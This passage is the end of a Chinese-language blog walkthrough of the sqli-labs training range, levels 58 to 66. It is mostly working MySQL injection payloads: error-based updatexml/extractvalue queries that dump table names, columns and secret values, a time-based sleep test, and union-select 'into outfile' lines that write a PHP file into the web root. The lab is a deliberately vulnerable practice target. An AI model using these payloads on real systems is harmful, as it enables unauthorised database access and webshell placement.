?id<span class="token operator">=</span><span class="token number">0</span>' <span class="token operator">or</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 字段名 id,sessid,secret_4FE6,tryy</span>
?id<span class="token operator">=</span><span class="token number">0</span>' <span class="token operator">or</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="/medias/sqli-labs/118.png" alt="118"></p> <p>爆数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>' <span class="token operator">or</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>secret_4FE6<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span>I2IZXOTD3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/119.png" alt="119"></p> <h2 id="less-59"><a href="#less-59" class="header-anchor">#</a> Less-59</h2> <p>测试后台闭合方式</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/120.png" alt="120"></p> <p>爆表、字段</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 表名 K7RBPJ7JI6</span>
?id<span class="token operator">=</span><span class="token number">0</span> <span class="token operator">or</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 字段 id,sessid,secret_9FTK,tryy</span>
?id<span class="token operator">=</span><span class="token number">0</span> <span class="token operator">or</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>爆数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span> <span class="token operator">or</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>secret_9FTK<span class="token punctuation">)</span> <span class="token keyword">from</span> K7RBPJ7JI6<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-60"><a href="#less-60" class="header-anchor">#</a> Less-60</h2> <p>测试后台闭合方式</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>&quot;<span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>爆表、字段</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 表名 FJ6S67618K</span>
?id<span class="token operator">=</span><span class="token number">0</span>&quot;<span class="token punctuation">)</span> <span class="token operator">or</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 字段 id,sessid,secret_BG4H,tryy</span>
?id<span class="token operator">=</span><span class="token number">0</span>&quot;<span class="token punctuation">)</span> <span class="token operator">or</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>爆数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>&quot;<span class="token punctuation">)</span> <span class="token operator">or</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>secret_BG4H<span class="token punctuation">)</span> <span class="token keyword">from</span> FJ6S67618K<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-61"><a href="#less-61" class="header-anchor">#</a> Less-61</h2> <p>测试后台闭合方式</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>爆表、字段</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 表名 7L3F6QOYU6</span>
?id<span class="token operator">=</span><span class="token number">0</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">or</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 字段 id,sessid,secret_RLGQ,tryy</span>
?id<span class="token operator">=</span><span class="token number">0</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">or</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>爆数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">or</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>secret_RLGQ<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">7</span>L3F6QOYU6<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-62"><a href="#less-62" class="header-anchor">#</a> Less-62</h2> <p>为什么给了130次机会 🤯</p> <p>测出后台闭合方式</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>'<span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>时间盲注？130次时间盲注就是用二分法优化也不够用吧 🤯</p> <p>试试能不能写个马子进去</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">') union select 1,2,'</span><span class="token operator">&lt;</span>?<span class="token operator">=</span>phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span><span class="token string">' into outfile'</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">62</span><span class="token operator">/</span><span class="token number">1.</span>php'<span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>成功</p> <p><img src="/medias/sqli-labs/121.png" alt="121"></p> <h2 id="less-63"><a href="#less-63" class="header-anchor">#</a> Less-63</h2> <p>测试后台闭合方式</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>写个马子</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">' union select 1,2,'</span><span class="token operator">&lt;</span>?<span class="token operator">=</span>phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span><span class="token string">' into outfile'</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">63</span><span class="token operator">/</span><span class="token number">1.</span>php'<span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>成功</p> <p><img src="/medias/sqli-labs/122.png" alt="122"></p> <h2 id="less-64"><a href="#less-64" class="header-anchor">#</a> Less-64</h2> <p>测试后台闭合方式</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这回不写马子了，把查询结果写到文件里</p> <p>爆表、字段</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 表名 7L3F6QOYU6 </span>
<span class="token comment"># 字段 secret_RLGQ</span>
?id<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/Less-64/1.php'</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>爆数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>secret_RLGQ<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">7</span>L3F6QOYU6<span class="token punctuation">)</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/Less-64/2.php'</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>成功</p> <p><img src="/medias/sqli-labs/123.png" alt="123"></p> <h2 id="less-65"><a href="#less-65" class="header-anchor">#</a> Less-65</h2> <p>测试后台闭合方式</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>&quot;<span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>爆表、字段</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 表名 7L3F6QOYU6  </span>
<span class="token comment"># 字段 secret_RLGQ</span>
?id<span class="token operator">=</span><span class="token number">0</span>&quot;<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/Less-65/1.php'</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>爆数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>&quot;<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>secret_RLGQ<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">7</span>L3F6QOYU6<span class="token punctuation">)</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/Less-65/2.php'</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>成功</p> <p><img src="/medias/sqli-labs/124.png" alt="124"></p> <p><s>我测，鬼打墙了，这两关表名、字段、数据一样？</s></p> <h2 id="less-66"><a href="#less-66" class="header-anchor">#</a> Less-66</h2> <p>我的Less-66哪去了</p> <p><img src="/medias/sqli-labs/125.png" alt="125"></p> <h2 id="最后"><a href="#最后" class="header-anchor">#</a> 最后</h2> <p>好像做完了？喵了个咪的，这个靶场质量太高了，感谢大佬们的分析以及总结，燃尽了</p> <p>参考、致谢：</p> <ul><li><a href="https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf" target="_blank" rel="noopener noreferrer">mysql注入天书<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://tari.moe/2022/sqli-labs" target="_blank" rel="noopener noreferrer">sqli-labs 靶场 1-65 通关记<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://github.com/Audi-1/sqli-labs/tree/master" target="_blank" rel="noopener noreferrer">Audi-1/sqli-labs<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div>  <div class="page-edit"><div class="edit-link"><a href="https://github.com/Apursuit/Apursuit.github.io/edit/master/docs/01.wp/21.sqli-labs学习记录.md" target="_blank" rel="noopener noreferrer">编辑</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <!----> <div class="last-updated"><span class="prefix">最后一次更新于:</span> <span class="time">2025/10/08, 22:34:57</span></div></div> <div class="page-nav-wapper"><!----> <!----></div></div> <!----></main></div> <div class="footer"><div class="icons"><a href="mailto:admin@gmail.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/Apursuit" title="GitHub" target="_blank" class="iconfont icon-github"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2024-2026
    <span></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          跟随系统
        </li><li class="iconfont icon-rijianmoshi">
          浅色模式
        </li><li class="iconfont icon-yejianmoshi">
          深色模式
        </li><li class="iconfont icon-yuedu">
          阅读模式
        </li></ul></div></div> <!----> <!----> <!----></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.dd92e586.js" defer></script><script src="/assets/js/2.1b31a38c.js" defer></script><script src="/assets/js/25.ac3d5247.js" defer></script>
  </body>
</html>
